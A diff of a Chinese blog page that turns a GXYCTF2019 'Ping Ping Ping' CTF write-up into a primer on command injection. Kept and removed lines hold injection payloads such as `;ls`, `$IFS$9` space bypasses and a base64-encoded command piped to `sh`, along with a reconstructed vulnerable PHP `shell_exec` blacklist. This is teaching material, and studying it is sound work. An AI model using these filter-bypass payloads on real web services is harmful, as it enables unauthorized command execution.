@@ -21,31 +21,32 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"quellisya.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":true,"version":"8.29.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"language":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
 
-    <meta name="description" content="从一道最经典的 ping 命令注入题出发，完整走一遍“找注入点 → 摸清过滤 → 逐个绕过 → 读 flag”的过程，重点讲清 $IFS 与 base64 这两种通用绕过手段。">
+    <meta name="description" content="命令注入的通用知识：漏洞是怎么产生的、shell 的几种分隔符、空格被过滤时用 $IFS 顶上、关键字被过滤时怎么换等价写法，附完整流程速查与常见问题。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Web 命令注入实战：[GXYCTF2019]Ping Ping Ping 详解">
-<meta property="og:url" content="https://quellisya.github.io/2026/10/25/web-ctf-command-injection/index.html">
+<meta property="og:title" content="命令注入基础：分隔符、$IFS 与过滤绕过">
+<meta property="og:url" content="https://quellisya.github.io/2026/10/25/web-knowledge-command-injection-basics/index.html">
 <meta property="og:site_name" content="Quellisya&#39;s Blog">
-<meta property="og:description" content="从一道最经典的 ping 命令注入题出发，完整走一遍“找注入点 → 摸清过滤 → 逐个绕过 → 读 flag”的过程，重点讲清 $IFS 与 base64 这两种通用绕过手段。">
+<meta property="og:description" content="命令注入的通用知识：漏洞是怎么产生的、shell 的几种分隔符、空格被过滤时用 $IFS 顶上、关键字被过滤时怎么换等价写法，附完整流程速查与常见问题。">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2026-10-25T02:23:00.000Z">
-<meta property="article:modified_time" content="2026-10-25T02:23:00.000Z">
+<meta property="article:published_time" content="2026-10-25T01:00:00.000Z">
+<meta property="article:modified_time" content="2026-10-28T12:30:00.000Z">
 <meta property="article:author" content="Quellisya">
-<meta property="article:tag" content="GXYCTF">
+<meta property="article:tag" content="$IFS">
 <meta property="article:tag" content="base64 编码">
+<meta property="article:tag" content="入门基础">
 <meta property="article:tag" content="命令执行">
 <meta property="article:tag" content="命令注入">
 <meta property="article:tag" content="空格绕过">
 <meta name="twitter:card" content="summary">
 
 
-<link rel="canonical" href="https://quellisya.github.io/2026/10/25/web-ctf-command-injection/">
+<link rel="canonical" href="https://quellisya.github.io/2026/10/25/web-knowledge-command-injection-basics/">
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://quellisya.github.io/2026/10/25/web-ctf-command-injection/","path":"/2026/10/25/web-ctf-command-injection/","title":"Web 命令注入实战：[GXYCTF2019]Ping Ping Ping 详解"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://quellisya.github.io/2026/10/25/web-knowledge-command-injection-basics/","path":"/2026/10/25/web-knowledge-command-injection-basics/","title":"命令注入基础：分隔符、$IFS 与过滤绕过"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>Web 命令注入实战：[GXYCTF2019]Ping Ping Ping 详解 | Quellisya's Blog</title>
+<title>命令注入基础：分隔符、$IFS 与过滤绕过 | Quellisya's Blog</title>
   
 
 
@@ -123,7 +124,7 @@
 
 
 <nav class="site-nav">
-  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-writeups"><a href="/categories/CTF/" rel="section"><i class="fa fa-flag fa-fw"></i>Writeups</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-rss"><a href="/atom.xml" rel="section"><i class="fa fa-rss fa-fw"></i>RSS</a></li>
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-rss"><a href="/atom.xml" rel="section"><i class="fa fa-rss fa-fw"></i>RSS</a></li>
       <li class="menu-item menu-item-search">
         <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
         </a>
@@ -174,7 +175,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0-%E5%85%88%E8%A1%A5%E4%B8%80%E7%82%B9%E5%9F%BA%E7%A1%80"><span class="nav-text">0. 先补一点基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0-1-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%98%AF%E6%80%8E%E4%B9%88%E4%BA%A7%E7%94%9F%E7%9A%84"><span class="nav-text">0.1 命令注入是怎么产生的</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0-2-shell-%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%86%E9%9A%94%E7%AC%A6"><span class="nav-text">0.2 shell 的几种分隔符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0-3-%E7%A9%BA%E6%A0%BC%E8%A2%AB%E8%BF%87%E6%BB%A4%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E%EF%BC%9A-IFS"><span class="nav-text">0.3 空格被过滤了怎么办：$IFS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0-4-%E5%85%B3%E9%94%AE%E5%AD%97%E8%A2%AB%E8%BF%87%E6%BB%A4%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E%EF%BC%9A%E6%8D%A2%E4%B8%AA%E8%A1%A8%E8%BE%BE%E6%96%B9%E5%BC%8F"><span class="nav-text">0.4 关键字被过滤了怎么办：换个表达方式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-GXYCTF2019-Ping-Ping-Ping"><span class="nav-text">1. [GXYCTF2019]Ping Ping Ping</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-%E8%A7%82%E5%AF%9F%E9%A2%98%E7%9B%AE"><span class="nav-text">1.1 观察题目</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-%E7%A1%AE%E8%AE%A4%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="nav-text">1.2 确认命令注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-%E7%94%A8%E6%8A%A5%E9%94%99%E4%BF%A1%E6%81%AF%E5%8F%8D%E6%8E%A8%E8%BF%87%E6%BB%A4%E8%A7%84%E5%88%99"><span class="nav-text">1.3 用报错信息反推过滤规则</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-%E8%BF%98%E5%8E%9F%E5%90%8E%E7%AB%AF%E6%BA%90%E7%A0%81"><span class="nav-text">1.4 还原后端源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-5-%E9%80%90%E4%B8%AA%E8%AF%95%E7%BB%95%E8%BF%87"><span class="nav-text">1.5 逐个试绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-6-%E6%9C%80%E7%BB%88-payload%EF%BC%9Abase64-%E6%95%B4%E6%9D%A1%E5%91%BD%E4%BB%A4"><span class="nav-text">1.6 最终 payload：base64 整条命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-7-%E6%8B%BF%E5%88%B0-flag"><span class="nav-text">1.7 拿到 flag</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E5%AE%8C%E6%95%B4%E6%B5%81%E7%A8%8B%E9%80%9F%E6%9F%A5%E8%A1%A8"><span class="nav-text">2. 完整流程速查表</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E6%96%B0%E6%89%8B%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98"><span class="nav-text">3. 新手常见问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E9%A1%BA%E6%89%8B%E8%81%8A%E8%81%8A%E6%80%8E%E4%B9%88%E9%98%B2"><span class="nav-text">4. 顺手聊聊怎么防</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-%E6%80%BB%E7%BB%93"><span class="nav-text">5. 总结</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%98%AF%E6%80%8E%E4%B9%88%E4%BA%A7%E7%94%9F%E7%9A%84"><span class="nav-number">1.</span> <span class="nav-text">命令注入是怎么产生的</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shell-%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%86%E9%9A%94%E7%AC%A6"><span class="nav-number">2.</span> <span class="nav-text">shell 的几种分隔符</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A9%BA%E6%A0%BC%E8%A2%AB%E8%BF%87%E6%BB%A4%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E%EF%BC%9A-IFS"><span class="nav-number">3.</span> <span class="nav-text">空格被过滤了怎么办：$IFS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E5%AD%97%E8%A2%AB%E8%BF%87%E6%BB%A4%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E%EF%BC%9A%E6%8D%A2%E4%B8%AA%E8%A1%A8%E8%BE%BE%E6%96%B9%E5%BC%8F"><span class="nav-number">4.</span> <span class="nav-text">关键字被过滤了怎么办：换个表达方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4%E6%B5%81%E7%A8%8B%E9%80%9F%E6%9F%A5%E8%A1%A8"><span class="nav-number">5.</span> <span class="nav-text">完整流程速查表</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%B0%E6%89%8B%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98"><span class="nav-number">6.</span> <span class="nav-text">新手常见问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A1%BA%E6%89%8B%E8%81%8A%E8%81%8A%E6%80%8E%E4%B9%88%E9%98%B2"><span class="nav-number">7.</span> <span class="nav-text">顺手聊聊怎么防</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -187,17 +188,19 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-count">9</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
-        <span class="site-state-item-count">1</span>
-        <span class="site-state-item-name">分类</span>
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">16</span>
-        <span class="site-state-item-name">标签</span>
+          <a href="/tags/">
+        <span class="site-state-item-count">23</span>
+        <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
 </div>
@@ -223,7 +226,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://quellisya.github.io/2026/10/25/web-ctf-command-injection/">
+    <link itemprop="mainEntityOfPage" href="https://quellisya.github.io/2026/10/25/web-knowledge-command-injection-basics/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -236,12 +239,12 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="Web 命令注入实战：[GXYCTF2019]Ping Ping Ping 详解 | Quellisya's Blog">
-      <meta itemprop="description" content="从一道最经典的 ping 命令注入题出发，完整走一遍“找注入点 → 摸清过滤 → 逐个绕过 → 读 flag”的过程，重点讲清 $IFS 与 base64 这两种通用绕过手段。">
+      <meta itemprop="name" content="命令注入基础：分隔符、$IFS 与过滤绕过 | Quellisya's Blog">
+      <meta itemprop="description" content="命令注入的通用知识：漏洞是怎么产生的、shell 的几种分隔符、空格被过滤时用 $IFS 顶上、关键字被过滤时怎么换等价写法，附完整流程速查与常见问题。">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          Web 命令注入实战：[GXYCTF2019]Ping Ping Ping 详解
+          命令注入基础：分隔符、$IFS 与过滤绕过
         </h1>
 
         <div class="post-meta-container">
@@ -252,7 +255,14 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2026-10-25 10:23:00" itemprop="dateCreated datePublished" datetime="2026-10-25T10:23:00+08:00">2026-10-25</time>
+      <time title="创建时间：2026-10-25 09:00:00" itemprop="dateCreated datePublished" datetime="2026-10-25T09:00:00+08:00">2026-10-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-10-28 20:30:00" itemprop="dateModified" datetime="2026-10-28T20:30:00+08:00">2026-10-28</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -260,25 +270,42 @@
       </span>
       <span class="post-meta-item-text">分类于</span>
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/web/command-injection/" itemprop="url" rel="index"><span itemprop="name">命令注入</span></a>
         </span>
     </span>
 
   
 </div>
 
-            <div class="post-description">从一道最经典的 ping 命令注入题出发，完整走一遍“找注入点 → 摸清过滤 → 逐个绕过 → 读 flag”的过程，重点讲清 $IFS 与 base64 这两种通用绕过手段。</div>
+            <div class="post-description">命令注入的通用知识：漏洞是怎么产生的、shell 的几种分隔符、空格被过滤时用 $IFS 顶上、关键字被过滤时怎么换等价写法，附完整流程速查与常见问题。</div>
         </div>
       </header>
 
     
     
     
-    <div class="post-body" itemprop="articleBody"><div class="note primary"><p><strong>一分钟速览</strong></p>
+    <div class="post-body" itemprop="articleBody">
+<nav class="series-nav">
+  <div class="series-nav__head">
+    <i class="fa fa-layer-group"></i>
+    <span class="series-nav__name">系列：命令注入</span>
+    <span class="series-nav__count">第 1 / 2 篇</span>
+  </div>
+  <ol class="series-nav__list"><li class="is-current"><a href="&#x2F;2026&#x2F;10&#x2F;25&#x2F;web-knowledge-command-injection-basics&#x2F;">命令注入基础：分隔符、$IFS 与过滤绕过</a></li><li><a href="&#x2F;2026&#x2F;10&#x2F;25&#x2F;web-ctf-command-injection-pingping&#x2F;">[GXYCTF2019] Ping Ping Ping：空格与关键字的双重过滤</a></li></ol>
+  <div class="series-nav__links"><a class="series-nav__next" href="&#x2F;2026&#x2F;10&#x2F;25&#x2F;web-ctf-command-injection-pingping&#x2F;">[GXYCTF2019] Ping Ping Ping：空格与关键字的双重过滤<i class="fa fa-arrow-right"></i></a></div>
+</nav><div class="note primary"><p><strong>一分钟速览</strong></p>
 <ul>
 <li><strong>难度</strong>：入门</li>
 <li><strong>考点</strong>：命令注入、空格过滤绕过、关键字过滤绕过、base64 编码</li>
-<li><strong>本题关键</strong>：用 <code>$IFS$9</code> 解决空格，用 base64 让请求里不出现 <code>flag</code></li>
+<li><strong>代表题关键</strong>：用 <code>$IFS$9</code> 解决空格，用 base64 让请求里不出现 <code>flag</code></li>
 <li><strong>一句话思路</strong>：<code>echo &lt;base64&gt; | base64 -d | sh</code>，把整条命令藏进编码里</li>
 </ul>
 </div>
@@ -295,7 +322,7 @@
 <p><code>找注入点</code> → <code>确认分隔符</code> → <code>摸黑名单</code> → <code>解决空格</code> → <code>解决关键字</code> → <code>编码兜底</code> → <code>读 flag</code></p>
 </div>
 
-<h2 id="0-先补一点基础"><a href="#0-先补一点基础" class="headerlink" title="0. 先补一点基础"></a>0. 先补一点基础</h2><h3 id="0-1-命令注入是怎么产生的"><a href="#0-1-命令注入是怎么产生的" class="headerlink" title="0.1 命令注入是怎么产生的"></a>0.1 命令注入是怎么产生的</h3><p>后端把用户输入直接拼进了一条系统命令里，例如：</p>
+<h2 id="命令注入是怎么产生的"><a href="#命令注入是怎么产生的" class="headerlink" title="命令注入是怎么产生的"></a>命令注入是怎么产生的</h2><p>后端把用户输入直接拼进了一条系统命令里，例如：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;ping -c 4 &quot;</span> . <span class="variable">$ip</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure>
 
 <p>正常输入 <code>127.0.0.1</code> 时执行：</p>
@@ -332,7 +359,7 @@
 <blockquote>
 <p>一句话记：<strong>看到参数被拼进命令，就先试分隔符。</strong></p>
 </blockquote>
-<h3 id="0-2-shell-的几种分隔符"><a href="#0-2-shell-的几种分隔符" class="headerlink" title="0.2 shell 的几种分隔符"></a>0.2 shell 的几种分隔符</h3><table>
+<h2 id="shell-的几种分隔符"><a href="#shell-的几种分隔符" class="headerlink" title="shell 的几种分隔符"></a>shell 的几种分隔符</h2><table>
 <thead>
 <tr>
 <th>写法</th>
@@ -374,7 +401,7 @@
 <div class="note info"><p>本题的符号黑名单里有 <code>&amp;</code>，但<strong>没有</strong> <code>;</code> 和 <code>|</code>，所以从 <code>;</code> 入手。</p>
 </div>
 
-<h3 id="0-3-空格被过滤了怎么办：-IFS"><a href="#0-3-空格被过滤了怎么办：-IFS" class="headerlink" title="0.3 空格被过滤了怎么办：$IFS"></a>0.3 空格被过滤了怎么办：$IFS</h3><p>shell 里有一个内部变量 <code>$IFS</code>（Internal Field Separator），默认值就是空格、Tab 和换行。所以：</p>
+<h2 id="空格被过滤了怎么办：-IFS"><a href="#空格被过滤了怎么办：-IFS" class="headerlink" title="空格被过滤了怎么办：$IFS"></a>空格被过滤了怎么办：$IFS</h2><p>shell 里有一个内部变量 <code>$IFS</code>（Internal Field Separator），默认值就是空格、Tab 和换行。所以：</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span>$IFS<span class="variable">$9flag</span>.php</span><br></pre></td></tr></table></figure>
 
 <p>在 shell 看来等价于：</p>
@@ -409,7 +436,7 @@
 <div class="note success"><p><strong>记忆技巧</strong>：<code>$IFS</code> 负责产生空格，<code>$9</code> 负责把变量名截断。两个一起用，就是“一个安全的空格”。</p>
 </div>
 
-<h3 id="0-4-关键字被过滤了怎么办：换个表达方式"><a href="#0-4-关键字被过滤了怎么办：换个表达方式" class="headerlink" title="0.4 关键字被过滤了怎么办：换个表达方式"></a>0.4 关键字被过滤了怎么办：换个表达方式</h3><p>黑名单过滤（<code>preg_match</code> 匹配 <code>flag</code>、<code>bash</code> 之类）通常只看<strong>原始字符串</strong>。绕过的基本思路是：<strong>让请求里不出现关键字，但让执行时出现。</strong></p>
+<h2 id="关键字被过滤了怎么办：换个表达方式"><a href="#关键字被过滤了怎么办：换个表达方式" class="headerlink" title="关键字被过滤了怎么办：换个表达方式"></a>关键字被过滤了怎么办：换个表达方式</h2><p>黑名单过滤（<code>preg_match</code> 匹配 <code>flag</code>、<code>bash</code> 之类）通常只看<strong>原始字符串</strong>。绕过的基本思路是：<strong>让请求里不出现关键字，但让执行时出现。</strong></p>
 <table>
 <thead>
 <tr>
@@ -445,188 +472,7 @@
 </tr>
 </tbody></table>
 <p>本题最终走的是最后一条：<strong>把整条命令做 base64，交给服务器解码执行。</strong></p>
-<h2 id="1-GXYCTF2019-Ping-Ping-Ping"><a href="#1-GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="1. [GXYCTF2019]Ping Ping Ping"></a>1. [GXYCTF2019]Ping Ping Ping</h2><h3 id="1-1-观察题目"><a href="#1-1-观察题目" class="headerlink" title="1.1 观察题目"></a>1.1 观察题目</h3><p>打开靶机，首页只有一行：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=</span><br></pre></td></tr></table></figure>
-
-<p>响应头里能看到 <code>X-Powered-By: PHP/5.6.40</code>，说明是 PHP 后端。这行 <code>/?ip=</code> 相当于出题人把参数名直接写在脸上了。</p>
-<p>带上参数请求：</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?ip=127.0.0.1</span> <span class="meta">HTTP/1.1</span></span><br></pre></td></tr></table></figure>
-
-<p>返回：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;pre&gt;PING 127.0.0.1 (127.0.0.1): 56 data bytes</span><br><span class="line">64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.036 ms</span><br><span class="line">...</span><br><span class="line">--- 127.0.0.1 ping statistics ---</span><br><span class="line">4 packets transmitted, 4 packets received, 0% packet loss</span><br></pre></td></tr></table></figure>
-
-<p><code>-c 4</code>、busybox 风格的输出，基本可以确定后端执行的是 <code>ping -c 4 $ip</code>。</p>
-<h3 id="1-2-确认命令注入"><a href="#1-2-确认命令注入" class="headerlink" title="1.2 确认命令注入"></a>1.2 确认命令注入</h3><p>追加一条 <code>ls</code>：</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?ip=127.0.0.1;ls</span> <span class="meta">HTTP/1.1</span></span><br></pre></td></tr></table></figure>
-
-<p>ping 的输出后面多出了目录列表：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag.php</span><br><span class="line">index.php</span><br></pre></td></tr></table></figure>
-
-<p>注入成立，而且目标文件就在眼前。</p>
-<div class="note success"><p>到这里先别急着读文件。<strong>先摸清过滤规则</strong>，否则每换一个 payload 都要重新猜为什么失败。</p>
-</div>
-
-<h3 id="1-3-用报错信息反推过滤规则"><a href="#1-3-用报错信息反推过滤规则" class="headerlink" title="1.3 用报错信息反推过滤规则"></a>1.3 用报错信息反推过滤规则</h3><p>这一步不要盲试。每发一个“问题输入”，观察报错，就能一点点把黑名单拼出来。</p>
-<table>
-<thead>
-<tr>
-<th>测试 payload</th>
-<th>返回</th>
-<th>推论</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>127.0.0.1;cat flag.php</code></td>
-<td><code>fxck your space!</code></td>
-<td>空格被过滤</td>
-</tr>
-<tr>
-<td><code>127.0.0.1;ls /</code></td>
-<td><code>1fxck your symbol!</code></td>
-<td><code>/</code> 被过滤；前面那个 <code>1</code> 是 <code>preg_match</code> 返回的匹配结果</td>
-</tr>
-<tr>
-<td><code>127.0.0.1;echo flag</code></td>
-<td><code>fxck your space!</code></td>
-<td>同时命中两条规则时，先报空格</td>
-</tr>
-<tr>
-<td><code>127.0.0.1;echo$IFS$9flag</code></td>
-<td><code>fxck your flag!</code></td>
-<td><code>flag</code> 关键字被正则拦截</td>
-</tr>
-</tbody></table>
-<div class="note warning"><p>注意第三行：同一个请求里既有空格又有 <code>flag</code>，返回的却是空格错误。说明<strong>检查是有先后顺序的</strong>，这能帮我们还原出源码结构。</p>
-</div>
-
-<h3 id="1-4-还原后端源码"><a href="#1-4-还原后端源码" class="headerlink" title="1.4 还原后端源码"></a>1.4 还原后端源码</h3><p>根据行为，这题和 GXYCTF2019 原题的公开源码一致，大致是：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 危险符号、控制字符</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;fxck your symbol!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2. 空格</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 3. bash</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/bash/&quot;</span>, <span class="variable">$ip</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 4. flag（按顺序出现 f、l、a、g 就拦截）</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;ping -c 4 &quot;</span> . <span class="variable">$ip</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>过滤清单可以总结成一张表：</p>
-<table>
-<thead>
-<tr>
-<th>类别</th>
-<th>被过滤的内容</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>符号</td>
-<td><code>&amp;</code> <code>/</code> <code>?</code> <code>*</code> <code>&lt;</code> <code>&gt;</code> <code>&#39;</code> <code>&quot;</code> <code>\</code> <code>(</code> <code>)</code> <code>[</code> <code>]</code> <code>&#123;</code> <code>&#125;</code> 加控制字符</td>
-</tr>
-<tr>
-<td>空格</td>
-<td>普通空格</td>
-</tr>
-<tr>
-<td>关键字</td>
